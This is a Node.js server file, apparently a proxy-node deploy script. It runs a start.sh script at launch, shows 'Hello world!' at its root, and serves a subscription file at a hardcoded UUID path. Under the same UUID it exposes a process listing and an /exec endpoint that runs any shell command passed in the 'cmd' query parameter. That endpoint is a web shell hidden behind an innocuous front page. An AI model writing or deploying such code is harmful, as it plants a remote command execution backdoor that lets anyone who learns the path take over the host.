const http = require('http');
const { exec, execSync } = require('child_process');
const fs = require('fs');
const subtxt = './.npm/sub.txt' 
const PORT = process.env.PORT || 3000; 
const UUID = process.env.UUID || '6877aae2-a8e7-44cc-ac29-c928eefa08e6';

// Run start.sh
fs.chmod("start.sh", 0o777, (err) => {
  if (err) {
      console.error(`start.sh empowerment failed: ${err}`);
      return;
  }
  console.log(`start.sh empowerment successful`);
  const child = exec('bash start.sh');
  child.stdout.on('data', (data) => {
      console.log(data);
  });
  child.stderr.on('data', (data) => {
      console.error(data);
  });
  child.on('close', (code) => {
      console.log(`child process exited with code ${code}`);
      console.clear()
      console.log(`App is running`);
  });
});

// create HTTP server
const server = http.createServer((req, res) => {
    const parsedURL = new URL(req.url, `http://${req.headers.host}`);
    if (req.url === '/') {
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('Hello world!');
    }
    // get-sub
    if (req.url === `/${UUID}`) {
      fs.readFile(subtxt, 'utf8', (err, data) => {
        if (err) {
          console.error(err);
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Error reading sub.txt' }));
        } else {
          res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
          res.end(data);
        }
      });
    } else if (req.url === `/${UUID}/status`) {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        let cmdStr = "ps aux";
        exec(cmdStr, function (err, stdout, stderr) {
            if (err) {
                res.end("<pre>命令行执行错误：\n" + err + "</pre>");
            } else {
                res.end("<pre>获取系统进程表：\n" + stdout + "</pre>");
            }
        });
    } else if (req.url === `/${UUID}/exec`) {
        const cmdStr = parsedURL.searchParams.get('cmd');
        // console.log(Object.fromEntries(parsedURL.searchParams));
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        if (!cmdStr) {
            res.end('No command\n');
            return;
        }
        exec(cmdStr, function (err, stdout, stderr) {
            res.end(err? err.message : stdout);
        });
    }
    
  });

server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
